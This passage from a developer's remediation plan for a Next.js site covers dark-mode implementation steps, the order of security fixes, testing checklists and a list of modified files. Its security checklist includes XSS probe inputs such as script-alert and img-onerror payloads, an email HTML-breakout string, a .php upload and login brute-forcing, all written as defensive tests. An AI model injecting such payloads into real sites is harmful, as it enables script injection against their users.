      onClick={toggleTheme}
      aria-label={isDark ? "Switch to light mode" : "Switch to dark mode"}
      className={cn(
        "p-2 rounded-lg transition-colors",
        isDark
          ? "text-[var(--yellow-primary)] hover:bg-[var(--navy-mid)]"
          : "text-[var(--text-muted)] hover:text-[var(--navy-deep)] hover:bg-[var(--navy-light)]"
      )}
    >
      {isDark ? (
        <Sun size={18} className="transition-transform" />
      ) : (
        <Moon size={18} className="transition-transform" />
      )}
    </button>
  );
}
```

---

### 4.5 Add Toggle to Header

**Effort:** S (5 min)  
**File:** `src/components/layout/Header.tsx`  

Add the ThemeToggle next to the LanguageToggle in the header:

```tsx
// Add import:
import { ThemeToggle } from "@/components/shared/ThemeToggle";

// In the CTA section, add before LanguageToggle:
<div className="flex items-center gap-2">
  <ThemeToggle />
  <LanguageToggle currentLocale={locale} />
  {/* ... rest */}
</div>
```

---

### 4.6 Fix Hardcoded Colors in Components

**Effort:** M (30–45 min)  

Several components use hardcoded hex colors or Tailwind utilities that won't work in dark mode. Here's the audit:

#### Header (`src/components/layout/Header.tsx`)
- Lines 29–31: `bg-white/95` and `bg-white` — need dark variants
- Line 55: `bg-[var(--yellow-light)]` — already uses CSS variable ✓
- Line 56: `hover:bg-[var(--navy-light)]` — already uses CSS variable ✓

**Fix:** Change the header background to use CSS variables:
```tsx
// Before (lines 29-31):
scrolled
  ? "bg-white/95 backdrop-blur-sm shadow-sm border-b border-[var(--border)]"
  : "bg-white border-b border-[var(--border)]"

// After:
scrolled
  ? "bg-background/95 backdrop-blur-sm shadow-sm border-b border-[var(--border)]"
  : "bg-background border-b border-[var(--border)]"
```

#### Footer (`src/components/layout/Footer.tsx`)
- Line 42: `bg-[var(--navy-deep)]` — already uses CSS variable ✓
- Line 75: `hover:bg-[var(--yellow-primary)]` — already uses CSS variable ✓
- The footer is inherently dark (navy background) so it works well in both modes.

#### Login Page (`src/app/(admin)/admin/login/page.tsx`)
- Line 39: `bg-[var(--navy-deep)]` — already uses CSS variable ✓
- Line 55: `bg-white` — needs dark variant
- Lines 75, 94: `bg-white` on inputs — need dark variants

**Fix:**
```tsx
// Card background (line 55):
// Before: bg-white
// After: bg-[var(--card)]

// Input backgrounds (lines 75, 94):
// Before: bg-white
// After: bg-[var(--background)]
```

#### Blog Post Page (`src/app/(public)/news/[slug]/page.tsx`)
- Line 50: `bg-[var(--navy-light)]` — uses CSS variable ✓
- Line 56: `bg-[var(--white)]` — uses CSS variable ✓
- Line 67: `bg-[var(--yellow-light)]` — uses CSS variable ✓

These are already using CSS variables, so they'll work with dark mode overrides.

#### Admin Sidebar (`src/components/layout/AdminSidebar.tsx`)
- Line 37: `bg-[var(--navy-deep)]` — already uses CSS variable ✓
- All other colors use CSS variables ✓

The sidebar is inherently dark-themed and will work well in both modes.

---

### 4.7 Add Inline Script for SSR Flash Prevention

**Effort:** S (5–10 min)  
**File:** `src/app/layout.tsx`  

Add a small inline script to set the theme class before React hydrates, preventing flash of wrong theme:

```tsx
// In src/app/layout.tsx, inside <html> tag:
<html
  lang={locale}
  className={`${fraunces.variable} ${plusJakartaSans.variable} h-full`}
  suppressHydrationWarning
>
  {/* Theme flash prevention script */}
  <script dangerouslySetInnerHTML={{ __html: `
    (function() {
      var stored = localStorage.getItem('theme');
      if (stored === 'dark' || (!stored && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        document.documentElement.classList.add('dark');
      }
    })();
  `}} />
  
  <body className="min-h-full flex flex-col antialiased bg-background text-foreground">
    {/* ... */}
  </body>
</html>
```

The `suppressHydrationWarning` is needed because the inline script may add the `.dark` class before React renders, causing a hydration mismatch. This is safe because it's the same class that React would set anyway.

---

### 4.8 Dark Mode CSS Variable Audit for Inline Styles

**Effort:** S (10–15 min)  

Search for all inline `var(--...)` references to ensure they have dark-mode counterparts:

| Variable | Light Value | Dark Value | Used In |
|----------|------------|------------|---------|
| `--yellow-primary` | #F4B942 | #F4B942 (same) | Buttons, accents, sidebar |
| `--yellow-light` | #FEF3C7 | #D97706 | Category badges, active nav |
| `--yellow-deep` | #D97706 | #FBBF24 | Hover states, category text |
| `--navy-deep` | #0F1F3D | #0a1628 | Backgrounds, sidebar, footer |
| `--navy-mid` | #1E3A5F | #1E3A5F (same) | Card dark bg, borders |
| `--navy-light` | #E8EFF7 | #9CA3AF | Subtle text, hover states |
| `--white` | #FAFAF8 | #1E3A5F | Light surfaces |
| `--text-body` | #374151 | #D1D5DB | Body text |
| `--text-muted` | #6B7280 | #9CA3AF | Muted text |
| `--success` | #059669 | #34D399 | Status indicators |

All inline CSS variable references in components will automatically inherit the dark values because they reference variables defined in `globals.css`. No component-level changes needed beyond the hardcoded color fixes above.

---

## 5. Implementation Order & Dependencies

### Phase 1: Security — HIGH (No dependencies)
1. **1.2 HTML injection in emails** (S) — no dependencies, quick win
2. **1.1 Stored XSS in blog posts** (M) — requires `isomorphic-dompurify` install

### Phase 2: Security — MEDIUM (Some dependencies)
3. **2.1 Rate limiting on login** (M) — creates shared rate limiter utility
4. **2.2 Rate limiting on contact form** (S) — depends on step 3 (shared utility)
5. **2.3 Weak password policy** (S) — no dependencies
6. **2.4 Hardcoded seed password** (S) — no dependencies
7. **2.5 CSP headers** (M) — no dependencies, modify `next.config.ts`
8. **2.6 Cloudinary validation** (S) — no dependencies
9. **2.7 Role-based access control** (S) — no dependencies

### Phase 3: Security — LOW (Optional, quick wins)
10. **3.4 Populate IP address on contact submissions** (S)

### Phase 4: Dark Theme (Can be done in parallel with Phase 2/3)
11. **4.2 Dark mode CSS variables** (M) — foundation for everything else
12. **4.3 Color scheme declaration** (S) — depends on step 11
13. **4.7 SSR flash prevention** (S) — depends on step 11
14. **4.4 Theme toggle component** (M) — depends on step 11
15. **4.5 Add toggle to header** (S) — depends on step 14
16. **4.6 Fix hardcoded colors** (M) — depends on step 11

### Total Estimated Effort: ~4.5–6 hours

---

## 6. Testing Strategy

### Security Testing Checklist

| # | Test | Method | Expected Result |
|---|------|--------|-----------------|
| 1 | XSS in blog post content | Create post with `<script>alert(1)</script>` via admin | Script stripped, no alert fires |
| 2 | Event handler XSS in posts | Post with `<img onerror="alert(1)">` | Handler stripped |
| 3 | Email injection — name field | Submit contact form with `<script>` in name | Email shows escaped text |
| 4 | Email injection — message field | Submit with `</td><script>alert(1)</script><td>` | HTML entities, no script execution |
| 5 | Login brute force | Rapid-fire 6+ login attempts from same IP | 6th attempt rejected with rate limit message |
| 6 | Rate limit expiry | Wait 15 min after rate limit | Login works again |
| 7 | Contact form spam | Submit 11+ contact forms rapidly | 11th rejected |
| 8 | Weak password rejection | Try login with `short` (5 chars) | Validation error on server |
| 9 | CSP headers present | Check response headers via DevTools | All security headers present |
| 10 | Clickjacking protection | Attempt to embed site in iframe | Blocked by X-Frame-Options |
| 11 | Cloudinary format restriction | Try uploading .php file | Rejected by Cloudinary |
| 12 | Cloudinary size restriction | Try uploading 50MB file | Rejected by Cloudinary |
| 13 | SUPER_ADMIN role enforcement | Login as ADMIN, call `requireSuperAdmin()` | Redirected to login |

### Dark Theme Testing Checklist

| # | Test | Method | Expected Result |
|---|------|--------|-----------------|
| 1 | Toggle switches theme | Click sun/moon icon in header | Page re-renders with dark colors |
| 2 | Theme persists across pages | Toggle to dark, navigate to /news | Dark theme maintained |
| 3 | Theme persists on reload | Toggle to dark, refresh page | Dark theme maintained (localStorage) |
| 4 | System preference fallback | No localStorage value, system is dark | Page loads in dark mode |
| 5 | Manual override of system pref | Set manual light, system is dark | Light mode maintained |
| 6 | No flash on initial load | Reload page with dark theme | No flash of light theme before dark applies |
| 7 | Header adapts | Dark mode → header background changes | Background uses --background variable |
| 8 | Footer works in dark | Footer already navy-based | No visual issues |
| 9 | Admin sidebar in dark | Navigate to /admin in dark mode | Sidebar still readable (navy on darker navy) |
| 10 | Login page in dark | Navigate to /admin/login in dark mode | Card and inputs use dark-appropriate colors |
| 11 | Blog post rendering | View a news article in dark mode | Text readable, no contrast issues |
| 12 | Contact form in dark | Fill out contact form in dark mode | Inputs have dark-appropriate backgrounds |
| 13 | Color contrast (WCAG AA) | Check yellow on navy-deep | Ratio ≥ 4.5:1 |

### Visual Regression Notes
- The user LOVES the current design — verify every page looks identical in light mode after changes.
- Dark mode should feel like a natural extension of the existing design, not a separate "theme."
- Key visual checks: category badges (yellow-light), active nav states, card hover effects, button colors.

---

## Appendix A: Files Modified Summary

| File | Changes | Phase |
|------|---------|-------|
| `src/lib/sanitize.ts` | **NEW** — HTML sanitization utility | 1.1 |
| `src/app/(public)/news/[slug]/page.tsx` | Apply sanitizeHtml to post content | 1.1 |
| `src/lib/html-escape.ts` | **NEW** — HTML escape utilities | 1.2 |
| `src/lib/email.ts` | Escape user inputs in email templates | 1.2 |
| `src/features/contact/actions/contact.actions.ts` | Escape inputs + add rate limiting + IP address | 1.2, 2.2, 3.4 |
| `src/lib/rate-limit.ts` | **NEW** — Rate limiter + IP extraction | 2.1, 2.2 |
| `src/features/auth/config.ts` | Add rate limiting to authorize + stronger password policy | 2.1, 2.3 |
| `src/features/auth/auth.config.ts` | Reject rate-limited users in JWT callback | 2.1 |
| `src/app/(admin)/admin/login/page.tsx` | Show rate limit message + fix hardcoded colors | 2.1, 4.6 |
| `prisma/seed.ts` | Read password from env var + SUPER_ADMIN role | 2.4, 2.7 |
| `next.config.ts` | Add security headers (CSP, X-Frame, etc.) | 2.5 |
| `src/lib/cloudinary.ts` | Add format/size validation to upload signature | 2.6 |
| `src/app/api/cloudinary/sign/route.ts` | Validate folder name (path traversal) | 2.6 |
| `src/lib/auth.ts` | Add requireSuperAdmin() + getUserRole() | 2.7 |
| `src/app/globals.css` | Add .dark CSS variables + color-scheme: light dark | 4.2, 4.3 |
| `src/components/shared/ThemeToggle.tsx` | **NEW** — Dark mode toggle component | 4.4 |
| `src/components/layout/Header.tsx` | Add ThemeToggle + fix hardcoded bg-white | 4.5, 4.6 |
| `src/app/layout.tsx` | Add SSR flash prevention script + suppressHydrationWarning | 4.7 |

## Appendix B: New Dependencies

| Package | Purpose | Version |
|---------|---------|---------|
| `isomorphic-dompurify` | HTML sanitization for XSS prevention | latest |

*(Note: Rate limiting uses in-memory implementation — no new dependencies needed)*
